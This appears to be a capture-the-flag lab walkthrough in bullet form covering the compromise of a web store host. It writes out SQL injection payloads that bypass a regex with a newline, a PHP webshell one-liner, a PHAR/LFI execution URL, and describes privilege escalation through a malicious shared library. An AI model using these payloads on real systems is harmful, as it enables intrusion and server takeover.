* Findings: The target IP is 10.10.11.229, Action: running nmap with command `nmap -p- --min-rate 10000 10.10.11.229`, Reasoning: to discover open ports on the target, Result: found port 22 (SSH) and port 80 (HTTP) open.
* Findings: The open ports are 22 (SSH) and 80 (HTTP), Action: running nmap with command `nmap -p 22,80 -sCV 10.10.11.229`, Reasoning: to gather more detailed information about the services running on the open ports, Result: identified OpenSSH 9.0p1 and Apache httpd 2.4.54 running on Ubuntu.
* Findings: The website is for a watch store, Action: exploring the website, Reasoning: to understand its structure and functionality, Result: discovered a file upload feature on `/upload.php` that accepts zip files containing a PDF.
* Findings: The upload feature accepts zip files with a PDF inside, Action: creating a zip file containing a sample PDF, Reasoning: to test the upload functionality, Result: successfully uploaded the zip file and received a link to access the uploaded PDF.
* Findings: The upload feature restricts to a single PDF file in the zip, Action: testing various file types and structures, Reasoning: to determine the limits of the upload functionality, Result: confirmed that only valid zip files containing a single PDF are accepted.
* Findings: The upload feature does not handle symbolic links correctly, Action: creating a symbolic link to `/etc/passwd` and zipping it, Reasoning: to test if the upload can read sensitive files, Result: uploaded the zip file but received an empty PDF when accessing it.
* Findings: The upload feature returns an empty PDF for symbolic links, Action: creating a symbolic link to `/home/rektsu/user.txt` and zipping it, Reasoning: to retrieve the user flag, Result: successfully accessed the user flag through the uploaded PDF link.
* Findings: The Apache configuration file is located at `/etc/apache2/sites-enabled/000-default.conf`, Action: using the script to read the Apache config file, Reasoning: to gather more information about the server configuration, Result: retrieved the standard Apache configuration without sensitive information.
* Findings: The script can read files from the server, Action: creating a Python script to automate file reading, Reasoning: to simplify the process of reading various files, Result: successfully read the contents of `/etc/hostname` and other files using the script.
* Findings: The intended path for Zipping is the `shop` directory, Action: Explore the `index.php` file, Reasoning: To understand how the application handles page requests and potential vulnerabilities, Result: Discovered that `index.php` includes pages based on user input, which could lead to local file inclusion vulnerabilities.

* Findings: The `index.php` file includes `functions.php` and calls `pdo_connect_mysql`, Action: Analyze `functions.php`, Reasoning: To understand how the database connection is established and if there are any security implications, Result: Noted that the MySQL user is `root`, indicating potential high permissions.

* Findings: The `product.php` file checks for an `id` parameter in the URL, Action: Review the input validation logic, Reasoning: To identify any weaknesses in how user input is handled, Result: Found that it uses a regex to filter input but does not prevent SQL injection.

* Findings: The regex used in `product.php` allows for potential bypass, Action: Test input with SQL injection, Reasoning: To see if the application is vulnerable to SQL injection attacks, Result: Successfully executed SQL injection by using `%0A` to bypass the regex check.

* Findings: The SQL query in `product.php` is constructed unsafely, Action: Attempt to manipulate the SQL query, Reasoning: To exploit the vulnerability and retrieve unauthorized data, Result: Managed to load the page with a different product by injecting `id=%0A100'+or+'1'='1`.

* Findings: The regex filtering allows for certain characters but not parentheses, Action: Analyze the regex structure, Reasoning: To understand how it affects SQL injection attempts, Result: Confirmed that the regex allows for injections that do not end with a non-digit character.

* Findings: The application redirects when invalid input is detected, Action: Test various SQL injection payloads, Reasoning: To determine the limits of the input validation, Result: Discovered that certain payloads like `id=%0A100'--+-` result in a redirect, indicating the regex is still enforcing some checks.

* Findings: The application uses PDO for database interactions, Action: Investigate how prepared statements are implemented, Reasoning: To assess the risk of SQL injection, Result: Found that while prepared statements are used, the input is still concatenated into the SQL query, leading to vulnerabilities.
* Findings: The application uses `preg_match` for input validation, Action: Analyzing the regex used in the application, Reasoning: To understand how input is filtered and identify potential bypass methods, Result: Identified that the regex allows for newline characters to bypass checks.
* Findings: The URL `http://10.10.11.229/shop/index.php?page=product&id=3` is vulnerable to SQL injection, Action: Testing various payloads in the `id` parameter, Reasoning: To determine if the application is susceptible to SQL injection attacks, Result: Successful injection with `id=%0A3` and `id=%0A100'+or+'1'='1`.
* Findings: The SQL query structure is `SELECT * FROM products WHERE id = '$id'`, Action: Crafting SQL injection payloads to manipulate the query, Reasoning: To extract data from the database, Result: Successfully retrieved data by injecting `id=%0A100'+or+'1'='1`.
* Findings: The regex used for input validation checks for non-digit characters at the end, Action: Testing payloads that end with digits, Reasoning: To bypass the second part of the regex validation, Result: Payloads like `id=%0A100'--+-1` were successful.
* Findings: The application uses MySQL as the database, Action: Attempting UNION injection to extract data, Reasoning: To enumerate the database structure, Result: Found that the products table likely has 8 columns.
* Findings: The application connects to MySQL as the root user, Action: Checking user privileges in the database, Reasoning: To identify potential escalation paths, Result: Discovered the root user has the FILE privilege.
* Findings: The application allows writing files to the server, Action: Crafting a payload to write a PHP webshell, Reasoning: To gain remote code execution, Result: Successfully wrote a PHP file to `/dev/shm`.
* Findings: The webshell executes PHP code, Action: Accessing the webshell via a browser, Reasoning: To confirm that the webshell is operational, Result: Successfully executed PHP code and displayed PHP info.
* Findings: The webshell can execute system commands, Action: Crafting a reverse shell command, Reasoning: To gain a shell on the target machine, Result: Established a reverse shell connection.
* Findings: The user `rektsu` can run the `stock` binary as root, Action: Checking the binary's functionality, Reasoning: To determine if it can be exploited for privilege escalation, Result: Found that it prompts for a password.
* Findings: The `stock` binary has a potential password in its strings, Action: Attempting to use the found password, Reasoning: To gain access to the binary's functionality, Result: Successfully accessed the menu of the `stock` binary.
* Findings: The `stock` binary attempts to load a shared library, Action: Creating a malicious shared object, Reasoning: To execute code when the binary loads the library, Result: Gained a root shell upon running the `stock` binary.
* Findings: The application has a vulnerability related to null bytes in zip filenames, Action: Creating a zip file with a null byte in the filename, Reasoning: To exploit the file upload mechanism, Result: Successfully uploaded a zip file that bypassed filename checks.
* Findings: The application uses `7z` to extract zip files, Action: Testing the extraction of a zip file with a null byte, Reasoning: To see how the application handles the filename, Result: The file was extracted without the null byte being recognized.
* Findings: The application checks for `.pdf` extensions, Action: Uploading a zip file with a `.pdf` extension, Reasoning: To bypass the file type validation, Result: Successfully uploaded the zip file containing a PHP webshell.
* Findings: The application allows access to files via LFI, Action: Accessing the uploaded webshell through LFI, Reasoning: To execute commands on the server, Result: Successfully executed commands via the webshell.
* Findings: PHAR files can be used to bypass file existence checks, Action: Creating a PHAR file containing a webshell, Reasoning: To exploit the LFI vulnerability, Result: Successfully uploaded and accessed the webshell via PHAR.
* Findings: PHP has a concept of PHAR files that can be accessed using the `phar://` filter, Action: demonstrated the use of `phar://` to access files within a PHAR archive, Reasoning: to show how PHAR files can be exploited in the context of Local File Inclusion (LFI), Result: confirmed that files inside a PHAR archive can be accessed and checked for existence using `file_exists`.

* Findings: Created a simple text file named `test.txt` and zipped it into `test.zip`, Action: used the command `zip test.zip test.txt`, Reasoning: to create a PHAR-compatible file that can be accessed via the `phar://` filter, Result: successfully created a zip file containing the text file.

* Findings: Accessed the contents of `test.txt` using PHP, Action: executed `echo file_get_contents('phar://test.zip/test.txt');`, Reasoning: to verify that the contents of the file can be read through the `phar://` filter, Result: output confirmed the contents as "this is a test".

* Findings: Verified the existence of the file using `file_exists`, Action: executed `if (file_exists('phar://test.zip/test.txt')) { echo "exists"; }`, Reasoning: to demonstrate that `file_exists` returns true for files inside a PHAR archive, Result: output confirmed that the file exists.

* Findings: Renamed `test.zip` to `test.pdf`, Action: executed `cp test.zip test.pdf`, Reasoning: to show that the file extension does not affect access via the `phar://` filter, Result: confirmed that the file can still be accessed using the new name.

* Findings: Created a web shell script named `shell.php`, Action: wrote the PHP code `<?php system($_REQUEST['cmd']); ?>`, Reasoning: to create a script that allows command execution via HTTP requests, Result: web shell script created successfully.

* Findings: Zipped the web shell into `shell.pdf`, Action: executed `zip shell.pdf shell.php`, Reasoning: to prepare the web shell for upload in a PHAR-compatible format, Result: confirmed that `shell.php` was added to `shell.pdf`.

* Findings: Created a zip archive named `shell.zip` containing `shell.pdf`, Action: executed `zip shell.zip shell.pdf`, Reasoning: to create a final archive that can be uploaded, Result: confirmed that `shell.pdf` was added to `shell.zip`.

* Findings: Uploaded `shell.zip` to the target application, Action: performed the upload through the web interface, Reasoning: to exploit the LFI vulnerability and gain access to the web shell, Result: received a link to the uploaded file.

* Findings: Located the uploaded file at a specific path, Action: accessed the file using the URL `http://10.10.11.229/shop/index.php?page=phar:///var/www/html/uploads/ea409d50349a8436fe49f7ec66aa6132/shell.pdf/shell&cmd=id`, Reasoning: to execute a command on the server through the web shell, Result: successfully executed the command `id`, revealing the user ID and group ID of the web server process.
